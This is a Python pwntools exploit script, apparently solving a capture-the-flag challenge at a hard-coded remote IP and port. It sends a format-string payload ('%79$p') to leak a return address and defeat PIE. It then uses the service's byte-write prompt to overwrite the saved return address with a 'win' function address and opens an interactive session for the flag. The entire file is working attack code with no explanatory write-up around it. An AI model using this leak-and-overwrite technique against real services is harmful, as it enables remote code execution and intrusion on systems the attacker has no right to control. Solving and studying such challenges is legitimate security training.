#!/usr/bin/env python3
from pwn import *

# Set up context
context.arch = 'amd64'
context.log_level = 'info'

HOST = "52.59.124.14"
PORT = 5030

# Offsets
# Based on analysis:
# RET (Arg 79) is at offset 392 from Ledger.
# 392 = 16 * 24 + 8.
SLOT = 24
ADJUSTMENT = 8
SIZE = 8

# PIE offsets (from solve.py and leaks)
# Leak (Pos 79) seems to be at offset 0xdc052 (from observed leak 0x...dc052)
# Win function is at 0xdbed0
LEAK_OFFSET = 0xdc052
WIN_OFFSET = 0xdbed0

def exploit():
    try:
        io = remote(HOST, PORT)
        
        # 1. Leak PIE address (Return Address stored at Pos 79)
        io.recvuntil(b'Name:\n')
        io.sendline(b'%79$p')
        
        io.recvuntil(b"market:\n")
        leak_str = io.recvline().decode().strip().replace('"', '')
        print(f"Leaf received: {leak_str}")
        
        if not leak_str or leak_str == '(nil)':
            print("Failed to leak return address")
            return
            
        leak_addr = int(leak_str, 16)
        pie_base = leak_addr - LEAK_OFFSET
        win_addr = pie_base + WIN_OFFSET
        
        print(f"Leak: {hex(leak_addr)}")
        print(f"PIE Base: {hex(pie_base)}")
        print(f"Win Address: {hex(win_addr)}")
        
        # 2. Scribe Write
        # We need to write WIN_ADDR to LEDGER + 392
        io.recvuntil(b'slot index 0..128):\n')
        io.sendline(str(SLOT).encode())
        
        io.recvuntil(b'adjustment inside the slot (0..15):\n')
        io.sendline(str(ADJUSTMENT).encode())
        
        io.recvuntil(b'How many bytes of ink? (max 8):\n')
        io.sendline(str(SIZE).encode())
        
        io.recvuntil(b'Ink (raw bytes):\n')
        io.send(p64(win_addr))
        
        # 3. Get Flag
        print("Payload sent. Waiting for flag...")
        io.interactive()
        
    except Exception as e:
        print(f"Exploit failed: {e}")

if __name__ == "__main__":
    exploit()
